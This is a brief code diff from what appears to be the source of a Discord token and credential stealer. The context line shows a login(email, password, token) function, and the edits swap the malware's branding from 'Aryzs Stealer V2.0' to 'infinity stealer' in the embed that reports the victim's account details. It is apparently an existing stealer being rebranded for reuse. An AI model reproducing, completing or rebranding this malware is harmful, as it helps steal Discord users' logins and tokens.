@@ -661,7 +661,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<:Info:987542721596108870> Info',
-            value: `\`\`\`Aryzs Stealer V2.0 - Remake\`\`\``,
+            value: `\`\`\`infinity stealer - Remake\`\`\``,
             inline: false,
           },
           {
@@ -710,7 +710,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'AryzsStealer',
+          text: 'infinitystealer',
         },
       },
     ],
